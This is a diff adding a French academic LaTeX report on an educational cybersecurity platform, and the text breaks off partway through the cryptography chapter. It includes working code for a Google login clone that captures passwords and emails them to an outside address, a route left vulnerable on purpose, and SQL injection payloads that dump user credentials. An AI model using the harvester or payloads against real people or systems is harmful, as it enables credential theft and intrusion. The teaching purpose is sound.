@@ -1,0 +1,1227 @@
+% ============================================================
+%  Rapport CyberLab — Plateforme éducative de cybersécurité
+%  Style : rapport académique noir & blanc
+% ============================================================
+\documentclass[12pt,a4paper]{report}
+
+% ── Encodage & langue ────────────────────────────────────────
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[french]{babel}
+
+% ── Mise en page ─────────────────────────────────────────────
+\usepackage{geometry}
+\geometry{top=2.5cm, bottom=2.5cm, left=3cm, right=2.5cm}
+\usepackage{setspace}
+\onehalfspacing
+\usepackage{parskip}
+\setlength{\parskip}{5pt}
+\setlength{\parindent}{0pt}
+
+% ── Police ───────────────────────────────────────────────────
+\usepackage{lmodern}
+\usepackage{microtype}
+
+% ── En-têtes / pieds de page ──────────────────────────────────
+\usepackage{fancyhdr}
+\pagestyle{fancy}
+\fancyhf{}
+\renewcommand{\headrulewidth}{0.4pt}
+\renewcommand{\footrulewidth}{0.4pt}
+\fancyhead[L]{\small\textit{CyberLab — Rapport de projet}}
+\fancyhead[R]{\small\textit{\leftmark}}
+\fancyfoot[C]{\small\thepage}
+\fancypagestyle{plain}{
+  \fancyhf{}
+  \renewcommand{\headrulewidth}{0pt}
+  \renewcommand{\footrulewidth}{0.4pt}
+  \fancyfoot[C]{\small\thepage}
+}
+
+% ── Listings (code source) ───────────────────────────────────
+\usepackage{listings}
+\usepackage{xcolor}
+\lstset{
+  backgroundcolor=\color{gray!6},
+  basicstyle=\ttfamily\footnotesize,
+  keywordstyle=\bfseries,
+  stringstyle=\itshape,
+  commentstyle=\itshape\color{gray!70!black},
+  numberstyle=\tiny\color{gray},
+  numbers=left,
+  numbersep=10pt,
+  frame=single,
+  framerule=0.4pt,
+  rulecolor=\color{gray!50},
+  breaklines=true,
+  breakatwhitespace=true,
+  showstringspaces=false,
+  tabsize=2,
+  captionpos=b,
+  xleftmargin=15pt,
+  xrightmargin=5pt,
+  aboveskip=10pt,
+  belowskip=8pt
+}
+\lstdefinelanguage{JavaScript}{
+  keywords={const,let,var,function,return,if,else,for,while,try,catch,
+             require,module,exports,async,await,new,this,class,import,from},
+  morestring=[b]",
+  morestring=[b]',
+  morestring=[b]`,
+  morecomment=[l]{//},
+  morecomment=[s]{/*}{*/}
+}
+\lstdefinelanguage{SQL}{
+  keywords={SELECT,FROM,WHERE,INSERT,INTO,VALUES,UPDATE,SET,DELETE,
+             UNION,ORDER,BY,AND,OR,NOT,LIKE,CREATE,TABLE,DROP,ALTER,
+             JOIN,LEFT,RIGHT,INNER,ON,AS,DISTINCT,GROUP,HAVING,LIMIT},
+  morestring=[b]',
+  morecomment=[l]{--},
+  morecomment=[s]{/*}{*/},
+  sensitive=false
+}
+
+% ── Graphiques & tableaux ────────────────────────────────────
+\usepackage{booktabs}
+\usepackage{array}
+\usepackage{tabularx}
+\usepackage{multirow}
+\newcolumntype{L}[1]{>{\raggedright\arraybackslash}p{#1}}
+\newcolumntype{C}[1]{>{\centering\arraybackslash}p{#1}}
+\usepackage{caption}
+\captionsetup{font=small, labelfont=bf}
+
+% ── TikZ ─────────────────────────────────────────────────────
+\usepackage{tikz}
+\usetikzlibrary{arrows.meta,shapes.geometric,positioning,calc}
+
+% ── Boîtes encadrées ─────────────────────────────────────────
+\usepackage{mdframed}
+\newmdenv[
+  linewidth=0.6pt,
+  linecolor=black!40,
+  backgroundcolor=gray!5,
+  innertopmargin=8pt,
+  innerbottommargin=8pt,
+  innerleftmargin=12pt,
+  innerrightmargin=12pt,
+  skipabove=10pt,
+  skipbelow=8pt
+]{notebox}
+
+\newmdenv[
+  linewidth=0.8pt,
+  linecolor=black!70,
+  backgroundcolor=white,
+  innertopmargin=8pt,
+  innerbottommargin=8pt,
+  innerleftmargin=12pt,
+  innerrightmargin=12pt,
+  skipabove=10pt,
+  skipbelow=8pt
+]{warnbox}
+
+% ── Hyperliens (noir pour impression) ────────────────────────
+\usepackage[colorlinks=false, hidelinks]{hyperref}
+
+% ── Numérotation ─────────────────────────────────────────────
+\setcounter{tocdepth}{2}
+\setcounter{secnumdepth}{3}
+
+% ── Commandes utilitaires ────────────────────────────────────
+\newcommand{\code}[1]{\texttt{#1}}
+\newcommand{\keyword}[1]{\textbf{#1}}
+
+% ── Titre des chapitres ──────────────────────────────────────
+\usepackage{titlesec}
+\titleformat{\chapter}[block]
+  {\normalfont\Large\bfseries}
+  {\thechapter.}{12pt}{\Large}
+  [\vspace{2pt}\hrule\vspace{4pt}]
+\titlespacing{\chapter}{0pt}{20pt}{18pt}
+
+% ============================================================
+\begin{document}
+
+% ── PAGE DE TITRE ─────────────────────────────────────────────
+\begin{titlepage}
+  \centering
+  \vspace*{2cm}
+
+  \rule{\textwidth}{1.5pt}\\[6pt]
+  {\LARGE\bfseries CyberLab}\\[4pt]
+  {\large Plateforme éducative de cybersécurité}\\[4pt]
+  \rule{\textwidth}{0.8pt}
+
+  \vspace{2cm}
+
+  {\Huge\bfseries Rapport de Projet}
+
+  \vspace{1.5cm}
+
+  {\large
+    Implémentation de quatre modules de sécurité offensifs et défensifs :\\[8pt]
+    Phishing · SQL Injection · IDS/Snort · Cryptographie DH+AES
+  }
+
+  \vspace{2.5cm}
+
+  \begin{tabular}{ll}
+    \textbf{Auteur}         & Arslan D. \\[5pt]
+    \textbf{Type}           & Projet académique de cybersécurité \\[5pt]
+    \textbf{Technologies}   & Node.js, Express, SQLite, HTML/CSS/JS \\[5pt]
+    \textbf{Déploiement}    & \url{https://cyberlab-uxey.onrender.com} \\[5pt]
+    \textbf{Dépôt}          & \url{https://github.com/D-Arslan/Cyberlab} \\[5pt]
+    \textbf{Date}           & Mai 2026 \\
+  \end{tabular}
+
+  \vfill
+
+  \begin{notebox}
+    \small\itshape
+    Ce projet est réalisé exclusivement dans un cadre académique.
+    Toutes les techniques présentées sont mises en œuvre dans un
+    environnement isolé à des fins éducatives uniquement. Aucune
+    utilisation malveillante n'est encouragée ni autorisée.
+  \end{notebox}
+
+\end{titlepage}
+
+% ── RÉSUMÉ ────────────────────────────────────────────────────
+\chapter*{Résumé}
+\addcontentsline{toc}{chapter}{Résumé}
+
+CyberLab est une plateforme web éducative de cybersécurité regroupant
+plusieurs modules interactifs, chacun dédié à une famille d'attaques ou
+de protocoles de sécurité. Le projet vise à fournir un environnement
+d'apprentissage pratique et légal pour comprendre les techniques offensives
+et les contre-mesures associées.
+
+Ce rapport documente la conception, l'implémentation et le déploiement de
+quatre modules développés dans le cadre de ce projet :
+\begin{itemize}
+  \item \textbf{Phishing} : reproduction d'une page de connexion Google
+        avec capture d'identifiants et page de sensibilisation.
+  \item \textbf{SQL Injection} : boutique fictive vulnérable avec mode guidé
+        (5 challenges progressifs) et mode libre.
+  \item \textbf{IDS Simulator} : simulateur de système de détection d'intrusion
+        avec moteur de règles Snort et tableau de bord temps réel.
+  \item \textbf{Cryptographie DH+AES} : implémentation d'un protocole de
+        communication sécurisée combinant l'échange de clés Diffie-Hellman
+        et le chiffrement AES-256-CBC.
+\end{itemize}
+
+L'ensemble est intégré dans une architecture Node.js modulaire, déployée
+en continu sur la plateforme Render.
+
+\vspace{1cm}
+\textbf{Mots-clés :} cybersécurité, phishing, injection SQL, IDS, Snort,
+Diffie-Hellman, AES, Node.js, plateforme éducative.
+
+% ── TABLE DES MATIÈRES ────────────────────────────────────────
+\tableofcontents
+\clearpage
+
+% ── LISTE DES FIGURES ─────────────────────────────────────────
+\listoffigures
+\addcontentsline{toc}{chapter}{Liste des figures}
+\clearpage
+
+% ============================================================
+\chapter{Introduction générale}
+% ============================================================
+
+\section{Contexte et motivation}
+
+La cybersécurité est l'un des domaines les plus critiques de l'informatique
+moderne. Comprendre les techniques d'attaque est indispensable pour concevoir
+des systèmes robustes et former des professionnels compétents. Or, il est
+difficile d'apprendre ces techniques de manière pratique sans un environnement
+contrôlé et légal.
+
+\keyword{CyberLab} est une réponse à ce besoin : une plateforme éducative
+web regroupant plusieurs modules interactifs, chacun dédié à une famille
+d'attaques ou de protocoles de sécurité. Chaque module propose une approche
+pédagogique en deux volets : l'\textit{exploration offensive} (comprendre
+comment l'attaque fonctionne) et la \textit{défense} (comprendre comment
+s'en protéger).
+
+\section{Objectifs du projet}
+
+\begin{itemize}
+  \item Implémenter des scénarios d'attaque réels dans un cadre contrôlé
+  \item Fournir une interface interactive et visuelle pour l'apprentissage
+  \item Regrouper plusieurs modules dans une plateforme unifiée et déployée en ligne
+  \item Illustrer les bonnes pratiques de sécurité à travers la comparaison
+        code vulnérable / code sécurisé
+  \item Déployer la plateforme en production pour des démonstrations réelles
+\end{itemize}
+
+\section{Modules développés}
+
+Quatre modules ont été implémentés dans le cadre de ce projet :
+
+\begin{center}
+\begin{tabular}{C{1.2cm} L{3.5cm} L{7.5cm}}
+  \toprule
+  \textbf{\#} & \textbf{Module} & \textbf{Thème} \\
+  \midrule
+  1 & Phishing        & Ingénierie sociale, capture d'identifiants, sensibilisation \\
+  2 & SQL Injection   & Injection SQL, exfiltration de données, prévention \\
+  3 & IDS Simulator   & Détection d'intrusion réseau, règles Snort \\
+  4 & SecureLink      & Échange de clés Diffie-Hellman, chiffrement AES-256 \\
+  \bottomrule
+\end{tabular}
+\end{center}
+
+\section{Structure du rapport}
+
+Le rapport est organisé comme suit. Le chapitre 2 présente l'architecture
+globale de la plateforme CyberLab. Les chapitres 3 à 6 détaillent chacun
+des quatre modules. Le chapitre 7 traite de l'intégration et du déploiement.
+Le chapitre 8 dresse un bilan et présente les perspectives d'évolution.
+
+% ============================================================
+\chapter{Architecture globale de CyberLab}
+% ============================================================
+
+\section{Stack technique}
+
+CyberLab repose sur une stack volontairement minimaliste pour faciliter
+le déploiement, la maintenance et la compréhension du code source.
+
+\begin{center}
+\begin{tabular}{L{3.5cm} L{3.5cm} L{6cm}}
+  \toprule
+  \textbf{Couche} & \textbf{Technologie} & \textbf{Rôle} \\
+  \midrule
+  Backend         & Node.js + Express    & Serveur HTTP, routage modulaire \\
+  Frontend        & HTML / CSS / JS pur  & Interfaces sans framework \\
+  Base de données & better-sqlite3       & SQLite in-memory (module SQLi) \\
+  Email           & Resend API (HTTPS)   & Envoi d'emails via API REST \\
+  Cryptographie   & Module \code{crypto} natif & DH, AES-CBC, SHA-256 \\
+  Déploiement     & Render (plan gratuit) & Hébergement cloud \\
+  Versioning      & Git + GitHub         & Gestion du code source \\
+  \bottomrule
+\end{tabular}
+\end{center}
+
+\begin{notebox}
+  \textbf{Choix Resend au lieu de Nodemailer/SMTP.}
+  La plateforme Render bloque les ports SMTP (465 et 587). L'API Resend
+  fonctionne via HTTPS (port 443), contournant cette contrainte.
+  Un seul appel HTTP suffit pour envoyer un email formaté en HTML.
+\end{notebox}
+
+\section{Architecture modulaire}
+
+Chaque module est totalement autonome : il possède son propre dossier
+\code{modules/<nom>/} contenant ses routes Express et ses fichiers statiques.
+Le fichier \code{server.js} central les charge tous au démarrage :
+
+\begin{lstlisting}[language=JavaScript, caption={Point d'entrée — chargement de tous les modules}]
+require('dotenv').config();
+const express = require('express');
+const path    = require('path');
+const app     = express();
+const PORT    = process.env.PORT || 3000;
+
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
+require('./modules/phishing/routes')(app);
+require('./modules/sqli/routes')(app);
+require('./modules/ids/routes')(app);
+require('./modules/crypto/routes')(app);
+
+app.listen(PORT, () =>
+  console.log(`CyberLab démarré sur http://localhost:${PORT}`)
+);
+\end{lstlisting}
+
+\section{Structure des répertoires}
+
+\begin{lstlisting}[numbers=none, caption={Arborescence complète du projet}]
+CyberLab/
+|-- server.js              % Point d'entree
+|-- package.json
+|-- .env                   % Variables d'environnement (non commite)
+|-- public/
+|   `-- index.html         % Landing page (hub des modules)
+`-- modules/
+    |-- phishing/
+    |   |-- routes.js
+    |   `-- public/        % Clone Google + page de sensibilisation
+    |-- sqli/
+    |   |-- db.js          % SQLite in-memory
+    |   |-- routes.js
+    |   `-- public/        % CyberShop + login + admin + education
+    |-- ids/
+    |   |-- engine.js      % Moteur de regles Snort
+    |   |-- traffic.js     % Generateur de trafic simule
+    |   |-- routes.js
+    |   `-- public/        % Challenge + monitor + education
+    `-- crypto/
+        |-- routes.js      % DH keygen, compute, AES encrypt/decrypt
+        `-- public/        % Demo interactive + education
+\end{lstlisting}
+
+\section{Pattern d'intégration des modules}
+
+Tous les modules suivent le même pattern : une fonction exportée qui
+reçoit l'instance Express en paramètre, enregistre les fichiers statiques
+et définit les routes API.
+
+\begin{lstlisting}[language=JavaScript, caption={Pattern uniforme de chaque module (exemple : crypto)}]
+const path    = require('path');
+const express = require('express');
+
+module.exports = function (app) {
+  // Fichiers statiques accessibles sous /crypto/
+  app.use('/crypto', express.static(path.join(__dirname, 'public')));
+
+  // Routes API sous /crypto/api/
+  app.post('/crypto/api/dh/keygen',   (req, res) => { /* ... */ });
+  app.post('/crypto/api/aes/encrypt', (req, res) => { /* ... */ });
+};
+\end{lstlisting}
+
+Cette architecture permet d'ajouter un nouveau module en une seule ligne
+dans \code{server.js}, sans modifier le code existant.
+
+% ============================================================
+\chapter{Module 1 — Phishing}
+% ============================================================
+
+\section{Présentation}
+
+Le module phishing reproduit une attaque d'ingénierie sociale classique :
+la création d'un clone d'une page de connexion légitime (Google) afin de
+capturer les identifiants d'un utilisateur. L'objectif pédagogique est
+double : comprendre le fonctionnement de cette attaque, et apprendre à
+s'en protéger grâce à la page de sensibilisation.
+
+\section{Flux de l'attaque}
+
+\begin{figure}[h]
+\centering
+\begin{tikzpicture}[
+  box/.style={draw, rounded corners=3pt, minimum width=2.5cm,
+              minimum height=0.8cm, font=\small, align=center,
+              fill=white},
+  arrow/.style={-Latex, thick},
+  label/.style={font=\scriptsize, midway}
+]
+  \node[box] (att) at (0,0)    {Attaquant};
+  \node[box] (vic) at (5.5,0)  {Victime};
+  \node[box] (srv) at (11,0)   {Serveur};
+
+  \draw[arrow] (att) -- node[above, label]{1. Envoie le lien piégé} (vic);
+  \draw[arrow] (vic) -- node[above, label]{2. Ouvre la page} (srv);
+  \draw[arrow] (srv) to[bend right=15] node[below, label]{3. Clone Google affiché} (vic);
+  \draw[arrow] (vic) to[bend right=20] node[above, label]{4. Saisit email + mot de passe} (srv);
+  \draw[arrow] (srv) to[bend left=30]  node[below, label]{5. Email → attaquant (Resend API)} (att);
+  \draw[arrow] (srv) to[bend right=35] node[below, label]{6. Redirection sensibilisation} (vic);
+\end{tikzpicture}
+\caption{Flux complet d'une attaque de phishing}
+\end{figure}
+
+\section{Clone de la page Google}
+
+La page reproduit fidèlement l'interface de connexion Google avec un flux
+en deux étapes.
+
+\begin{center}
+\begin{tabular}{L{4cm} L{9cm}}
+  \toprule
+  \textbf{Élément} & \textbf{Implémentation} \\
+  \midrule
+  Logo Google    & \code{<span>} CSS colorés lettre par lettre \\
+                 & (\#4285F4, \#EA4335, \#FBBC05, \#34A853) \\
+  Labels flottants & Transition CSS \code{transform: translateY} \\
+  Validation     & Messages d'erreur identiques à Google \\
+  Animation      & \code{fadeIn + translateX} entre les deux étapes \\
+  Favicon        & Favicon Google officiel \\
+  Responsive     & Media queries pour adaptation mobile \\
+  \bottomrule
+\end{tabular}
+\end{center}
+
+\begin{notebox}
+  \textbf{Note d'implémentation — Logo Google.}
+  Le rendu d'un SVG Google était incorrect sur certains navigateurs.
+  La solution retenue est de coder chaque lettre dans un \code{<span>}
+  avec la couleur CSS officielle correspondante.
+\end{notebox}
+
+\section{Capture et exfiltration}
+
+Lors de la soumission du formulaire, une requête \code{POST /phishing/submit}
+est émise vers le serveur. Celui-ci extrait les données et les transmet
+par email via l'API Resend.
+
+\begin{lstlisting}[language=JavaScript, caption={Capture des identifiants et envoi par email}]
+app.post('/phishing/submit', async (req, res) => {
+  const { email, password } = req.body;
+  const ip   = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const date = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
+
+  await fetch('https://api.resend.com/emails', {
+    method: 'POST',
+    headers: {
+      'Authorization': `Bearer ${process.env.RESEND_API_KEY}`,
+      'Content-Type':  'application/json'
+    },
+    body: JSON.stringify({
+      from:    'phishing@cyberlab.dev',
+      to:      process.env.EMAIL_TO,
+      subject: '[CyberLab] Identifiants capturés',
+      html:    `<b>Email :</b> ${email}<br>
+                <b>Mot de passe :</b> ${password}<br>
+                <b>IP :</b> ${ip}<br>
+                <b>Date :</b> ${date}`
+    })
+  });
+
+  res.json({ success: true });
+});
+\end{lstlisting}
+
+Les données capturées sont : l'email, le mot de passe, l'adresse IP
+(via le header \code{x-forwarded-for}), et l'horodatage.
+
+\section{Page de sensibilisation}
+
+Après la capture, l'utilisateur est redirigé vers \code{awareness.html}
+qui lui explique qu'il vient d'être victime d'une simulation de phishing,
+détaille les 4 étapes de l'attaque qui s'est déroulée, et lui fournit
+une checklist de protection :
+vérifier l'URL, activer le 2FA, utiliser un gestionnaire de mots de passe,
+accéder aux sites en tapant l'URL manuellement.
+
+\section{Aspects légaux}
+
+\begin{warnbox}
+  \textbf{Cadre légal.}
+  Le phishing est un délit puni par l'article 226-4-1 du Code pénal.
+  Ce module est utilisé \textbf{exclusivement en contexte académique}.
+  Les identifiants capturés sont transmis uniquement à l'adresse email
+  du propriétaire du laboratoire et ne sont pas conservés.
+\end{warnbox}
+
+% ============================================================
+\chapter{Module 2 — SQL Injection}
+% ============================================================
+
+\section{Présentation}
+
+Le module SQL Injection est un laboratoire interactif reproduisant une
+fausse boutique en ligne (\textbf{CyberShop}) volontairement vulnérable.
+Deux modes sont proposés : un \textit{mode guidé} avec 5 challenges
+progressifs reproduisant la méthodologie réelle d'un attaquant, et un
+\textit{mode libre} pour tester ses connaissances sans assistance.
+
+\section{Base de données SQLite in-memory}
+
+La base de données est créée en mémoire à chaque démarrage du serveur
+(module \code{better-sqlite3}), garantissant un environnement propre
+et sans persistance de données réelles.
+
+\begin{center}
+\begin{tabular}{L{3cm} L{4cm} L{6.5cm}}
+  \toprule
+  \textbf{Table} & \textbf{Colonnes principales} & \textbf{Contenu} \\
+  \midrule
+  \code{products}
+    & id, name, description, price, category, stock
+    & 12 produits tech fictifs \\[4pt]
+  \code{users}
+    & id, username, password, email, role
+    & 3 utilisateurs dont admin, mots de passe en clair \\[4pt]
+  \code{secret\_data}
+    & id, flag, description
+    & 3 flags CTF à découvrir via injection \\
+  \bottomrule
+\end{tabular}
+\end{center}
+
+Les mots de passe sont stockés en clair intentionnellement pour illustrer
+cette mauvaise pratique et permettre leur récupération via UNION SELECT.
+
+\section{Code vulnérable et code sécurisé}
+
+La différence fondamentale entre une route vulnérable et une route sécurisée
+est la manière dont l'entrée utilisateur est traitée.
+
+\begin{lstlisting}[language=JavaScript, caption={Route vulnérable — concaténation directe}]
+// VULNERABLE : l'entree utilisateur est inseree comme du code SQL
+app.get('/sqli/api/search', (req, res) => {
+  const query = req.query.q;
+  const sql   = `SELECT * FROM products
+                 WHERE name LIKE '%${query}%'
+                 OR description LIKE '%${query}%'`;
+  const results = db.prepare(sql).all();
+  res.json({ results, sql }); // La requete SQL est aussi renvoyee
+});
+\end{lstlisting}
+
+\begin{lstlisting}[language=JavaScript, caption={Route sécurisée — requête paramétrée}]
+// SECURISE : la valeur est traitee comme une donnee, jamais comme du code
+app.get('/sqli/api/search-safe', (req, res) => {
+  const query = req.query.q;
+  const param = `%${query}%`;
+  const sql   = `SELECT * FROM products
+                 WHERE name LIKE ?
+                 OR description LIKE ?`;
+  const results = db.prepare(sql).all(param, param);
+  res.json({ results });
+});
+\end{lstlisting}
+
+Dans la version sécurisée, la base de données reçoit la requête et la
+valeur séparément via des \textit{prepared statements}. L'entrée
+utilisateur ne peut jamais être interprétée comme du code SQL.
+
+\section{Les 5 challenges du mode guidé}
+
+Les challenges reproduisent la méthodologie réelle d'un attaquant,
+étape par étape, de la détection de la vulnérabilité jusqu'à l'extraction
+de données confidentielles.
+
+\begin{center}
+\begin{tabular}{C{0.6cm} L{3.2cm} L{4.5cm} L{4.5cm}}
+  \toprule
+  \textbf{\#} & \textbf{Objectif} & \textbf{Injection} & \textbf{Résultat attendu} \\
+  \midrule
+  1 & Détecter la faille
+    & \code{'}
+    & Erreur SQL — faille confirmée \\[4pt]
+  2 & Contourner les filtres
+    & \code{' OR 1=1 --}
+    & Tous les produits affichés \\[4pt]
+  3 & Compter les colonnes
+    & \code{' ORDER BY 6 --}
+    & 6 colonnes identifiées \\[4pt]
+  4 & Exfiltrer les utilisateurs
+    & \code{' UNION SELECT 1,username,password,email,role,6 FROM users --}
+    & Identifiants récupérés \\[4pt]
+  5 & Cartographier la BDD
+    & \code{' UNION SELECT 1,name,sql,3,4,5 FROM sqlite\_master --}
+    & Structure complète + flags CTF \\
+  \bottomrule
+\end{tabular}
+\end{center}
+
+\subsection{Challenge 4 — Exfiltration par UNION SELECT}
+
+\begin{lstlisting}[language=SQL, caption={Requête générée par l'injection du challenge 4}]
+SELECT * FROM products
+WHERE name LIKE '%'
+UNION SELECT 1, username, password, email, role, 6 FROM users --'%'
+\end{lstlisting}
+
+La clause \code{UNION SELECT} fusionne les résultats de deux requêtes.
+Le nombre de colonnes doit être identique (6 colonnes, déterminé au
+challenge 3). Les valeurs \code{1} et \code{6} sont des placeholders
+pour correspondre aux colonnes de la première requête.
+
+\subsection{Challenge 5 — Cartographie via sqlite\_master}
+
+\begin{lstlisting}[language=SQL, caption={Lecture du schéma de la base de données}]
+SELECT * FROM products
+WHERE name LIKE '%'
+UNION SELECT 1, name, sql, 3, 4, 5 FROM sqlite_master --'%'
+\end_lstlisting}
+\end{lstlisting}
+
+\code{sqlite\_master} est une table système de SQLite contenant la
+définition (\code{CREATE TABLE}) de toutes les tables. L'attaquant
+y découvre l'existence de \code{secret\_data}, puis l'interroge pour
+extraire les flags CTF.
+
+\section{Prévention}
+
+\begin{enumerate}
+  \item \textbf{Prepared statements} (défense principale) : séparation
+        requête/données, rendu impossible de l'injection
+  \item Utilisation d'un ORM (Sequelize, Prisma, SQLAlchemy)
+  \item Validation et assainissement des entrées utilisateur
+  \item Principe du moindre privilège sur la base de données
+  \item Ne jamais exposer les messages d'erreur SQL en production
+\end{enumerate}
+
+\section{Aspects légaux}
+
+\begin{warnbox}
+  \textbf{Cadre légal.}
+  L'injection SQL est punissable par l'article 323-1 du Code pénal
+  (accès frauduleux à un système de traitement automatisé de données) :
+  jusqu'à 5 ans d'emprisonnement et 150\,000 € d'amende.
+  Ce module utilise une base de données fictive en mémoire.
+\end{warnbox}
+
+% ============================================================
+\chapter{Module 3 — IDS Simulator (CyberGuard)}
+% ============================================================
+
+\section{Présentation}
+
+\textbf{CyberGuard} est un simulateur de système de détection d'intrusion
+(IDS) web-based. L'utilisateur écrit des règles au format \textbf{Snort}
+et les teste contre du trafic réseau simulé. Trois modes sont disponibles :
+mode guidé (5 challenges progressifs), monitor temps réel, et une page
+éducative sur la théorie des IDS.
+
+\section{Anatomie d'une règle Snort}
+
+Une règle Snort se compose d'une action, d'un protocole, d'adresses et
+ports source/destination, et d'un ensemble d'options entre parenthèses.
+
+\begin{lstlisting}[numbers=none, caption={Format d'une règle Snort}]
+alert tcp 192.168.1.0/24 any -> any 22 (msg:"SSH Brute Force"; content:"SSH"; flags:S; sid:1001;)
+\end{lstlisting}
+
+\begin{center}
+\begin{tabular}{L{3cm} L{9.5cm}}
+  \toprule
+  \textbf{Champ} & \textbf{Description} \\
+  \midrule
+  \code{alert}           & Action déclenchée si la règle correspond \\
+  \code{tcp}             & Protocole réseau (tcp, udp, icmp, any) \\
+  \code{192.168.1.0/24}  & Adresse IP source (supporte CIDR et \code{any}) \\
+  \code{any} (src port)  & Port source \\
+  \code{any} (dst IP)    & Adresse IP de destination \\
+  \code{22}              & Port de destination \\
+  \code{msg:"..."}       & Message de l'alerte \\
+  \code{content:"..."}   & Sous-chaîne à rechercher dans le payload \\
+  \code{flags:S}         & Flag TCP à vérifier (SYN, ACK, FIN...) \\
+  \code{sid:1001}        & Identifiant unique de la règle \\
+  \bottomrule
+\end{tabular}
+\end{center}
+
+\section{Moteur de règles (engine.js)}
+
+Le moteur parse les règles Snort et les applique à chaque paquet du
+trafic simulé. Le matching est séquentiel : protocole → IP → ports →
+contenu du payload → flags TCP.
+
+\begin{lstlisting}[language=JavaScript, caption={Algorithme de matching d'une règle Snort}]
+function matchRule(rule, packet) {
+  // 1. Verification du protocole
+  if (rule.proto !== 'any' && rule.proto !== packet.proto) return false;
+
+  // 2. Verification des adresses IP (supporte CIDR ex: 192.168.1.0/24)
+  if (rule.srcIp !== 'any' && !matchIP(rule.srcIp, packet.src)) return false;
+  if (rule.dstIp !== 'any' && !matchIP(rule.dstIp, packet.dst)) return false;
+
+  // 3. Verification des ports
+  if (rule.srcPort !== 'any' && rule.srcPort !== packet.srcPort) return false;
+  if (rule.dstPort !== 'any' && rule.dstPort !== packet.dstPort) return false;
+
+  // 4. Recherche de sous-chaine dans le payload
+  if (rule.content && !packet.payload.includes(rule.content)) return false;
+
+  // 5. Verification des flags TCP
+  if (rule.flags && rule.flags !== packet.flags) return false;
+
+  return true; // Toutes les conditions satisfaites -> ALERTE
+}
+\end{lstlisting}
+
+\section{Générateur de trafic simulé (traffic.js)}
+
+\begin{center}
+\begin{tabular}{L{3.5cm} L{3cm} L{6.5cm}}
+  \toprule
+  \textbf{Type de trafic} & \textbf{Catégorie} & \textbf{Description} \\
+  \midrule
+  HTTP/HTTPS, DNS, SMB    & Normal  & Requêtes réseau standard \\
+  DHCP, NTP, SMTP         & Normal  & Protocoles de services \\
+  Ping Flood              & Attaque & Rafale de paquets ICMP vers une cible \\
+  Port Scan               & Attaque & Paquets SYN vers ports 22, 80, 443, 3306 \\
+  SQL Injection           & Attaque & Payload contenant \code{UNION SELECT} \\
+  SSH Brute Force         & Attaque & Tentatives répétées sur le port 22 \\
+  DNS Exfiltration        & Attaque & Sous-domaines encodés anormalement longs \\
+  \bottomrule
+\end{tabular}
+\end{center}
+
+\section{Les 5 challenges du mode guidé}
+
+\begin{center}
+\begin{tabular}{C{0.5cm} L{3.5cm} L{8.5cm}}
+  \toprule
+  \textbf{\#} & \textbf{Thème} & \textbf{Règle attendue} \\
+  \midrule
+  1 & Ping Flood
+    & \code{alert icmp any any -> any any (msg:"Ping Flood"; sid:1;)} \\[4pt]
+  2 & Port Scan
+    & \code{alert tcp any any -> any any (msg:"Port Scan"; flags:S; sid:2;)} \\[4pt]
+  3 & SQL Injection
+    & \code{alert tcp any any -> any 80 (msg:"SQLi"; content:"UNION"; sid:3;)} \\[4pt]
+  4 & SSH Brute Force
+    & \code{alert tcp any any -> any 22 (msg:"SSH BF"; content:"SSH"; sid:4;)} \\[4pt]
+  5 & DNS Exfiltration
+    & \code{alert udp any any -> any 53 (msg:"DNS Exfil"; content:"exfil"; sid:5;)} \\
+  \bottomrule
+\end{tabular}
+\end{center}
+
+\section{Mode Monitor — Dashboard temps réel}
+
+\begin{figure}[h]
+\centering
+\begin{tikzpicture}[
+  block/.style={draw, rounded corners=3pt, minimum width=3cm,
+                minimum height=0.85cm, font=\small, align=center, fill=white},
+  arrow/.style={-Latex, thick}
+]
+  \node[block] (gen)  {Générateur\\de trafic};
+  \node[block, right=2cm of gen]  (eng)  {Moteur Snort\\(engine.js)};
+  \node[block, right=2cm of eng]  (ui)   {Dashboard\\(monitor.html)};
+  \node[block, above=1.2cm of eng] (rule) {Règles\\utilisateur};
+
+  \draw[arrow] (gen)  -- (eng)  node[midway, above, font=\scriptsize]{paquets};
+  \draw[arrow] (rule) -- (eng)  node[midway, right, font=\scriptsize]{parse};
+  \draw[arrow] (eng)  -- (ui)   node[midway, above, font=\scriptsize]{alertes};
+\end{tikzpicture}
+\caption{Pipeline du mode Monitor}
+\end{figure}
+
+Le dashboard génère du trafic toutes les 2 secondes et l'affiche en
+temps réel. Un score comptabilise les vraies détections (vrais positifs)
+et les faux positifs, permettant d'affiner les règles.
+
+% ============================================================
+\chapter{Module 4 — Cryptographie DH + AES (SecureLink)}
+% ============================================================
+
+\section{Présentation}
+
+\textbf{SecureLink} implémente un protocole de communication sécurisée
+combinant l'échange de clés \textbf{Diffie-Hellman} et le chiffrement
+symétrique \textbf{AES-256-CBC}. L'objectif est de montrer concrètement
+comment deux parties peuvent s'accorder sur un secret partagé via un
+canal public, sans jamais l'avoir échangé directement.
+
+\section{Partie 1 — Échange de clés Diffie-Hellman}
+
+\subsection{Fondements mathématiques}
+
+L'échange de clés DH, proposé par Whitfield Diffie et Martin Hellman
+en 1976~\cite{diffie1976}, repose sur la difficulté du
+\textbf{problème du logarithme discret} : connaissant $g$, $p$ et
+$A = g^a \bmod p$, il est computationnellement infaisable de retrouver
+$a$ pour des valeurs de $p$ suffisamment grandes (2048 bits minimum
+en production).
+
+\textbf{Protocole :}
+\begin{enumerate}
+  \item Paramètres publics : $p$ (grand nombre premier), $g$ (générateur)
+  \item Alice choisit un entier secret $a$, calcule $A = g^a \bmod p$
+  \item Bob choisit un entier secret $b$, calcule $B = g^b \bmod p$
+  \item Alice et Bob échangent $A$ et $B$ sur le canal public
+  \item Alice calcule $S = B^a \bmod p = g^{ab} \bmod p$
+  \item Bob calcule $S = A^b \bmod p = g^{ab} \bmod p$
+  \item Les deux secrets sont identiques — canal sécurisé établi
+\end{enumerate}
+
+La propriété clé est :
+$$(g^a \bmod p)^b \bmod p \;=\; g^{ab} \bmod p \;=\; (g^b \bmod p)^a \bmod p$$
+
+\subsubsection{Exemple numérique ($p=23$, $g=5$)}
+
+\begin{center}
+\begin{tabular}{L{6cm} L{6.5cm}}
+  \toprule
+  \textbf{Alice ($a = 6$)} & \textbf{Bob ($b = 15$)} \\
+  \midrule
